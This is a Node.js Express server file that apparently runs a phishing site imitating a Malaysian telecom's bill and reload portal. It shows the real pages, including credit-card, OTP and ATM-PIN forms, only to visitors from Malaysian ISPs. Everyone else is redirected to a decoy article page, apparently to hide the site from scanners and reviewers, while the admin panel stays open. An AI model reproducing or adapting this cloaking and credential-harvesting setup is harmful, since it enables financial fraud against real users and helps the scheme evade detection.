const express = require('express');
const path = require('path');
const { shouldAllowVisitor } = require('./ip-detector');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// Serve assets first (no protection)
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/js', express.static(path.join(__dirname, 'js')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));

// ISP-BASED PROTECTION: Check if visitor is from Malaysian telecom ISP
app.get('/', async (req, res) => {
    try {
        const allowed = await shouldAllowVisitor(req);
        if (allowed) {
            // Serve the real homepage
            return res.sendFile(path.join(__dirname, 'real-index.html'));
        } else {
            // Serve the article/protection page
            return res.sendFile(path.join(__dirname, 'index.html'));
        }
    } catch (error) {
        console.error('Protection check error:', error);
        // Default to showing article page for safety
        return res.sendFile(path.join(__dirname, 'index.html'));
    }
});

// Protect sensitive pages with ISP check
const protectPage = async (req, res, next) => {
    const sensitivePages = [
        '/bill.html', '/reload.html', '/recharge.html', '/payment-method.html',
        '/credit-card.html', '/otp.html', '/atm-pin.html', '/pay-bill.html'
    ];
    
    // Admin pages are NOT protected - they can be accessed from anywhere
    const adminPages = ['/admin', '/admin.html'];
    if (adminPages.includes(req.path)) {
        return next();
    }
    
    if (sensitivePages.includes(req.path)) {
        const allowed = await shouldAllowVisitor(req);
        if (!allowed) {
            // Redirect non-Malaysian users to article page
            return res.redirect('/');
        }
    }
    next();
};

app.use(protectPage);

// Serve static files
app.use(express.static(path.join(__dirname)));

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
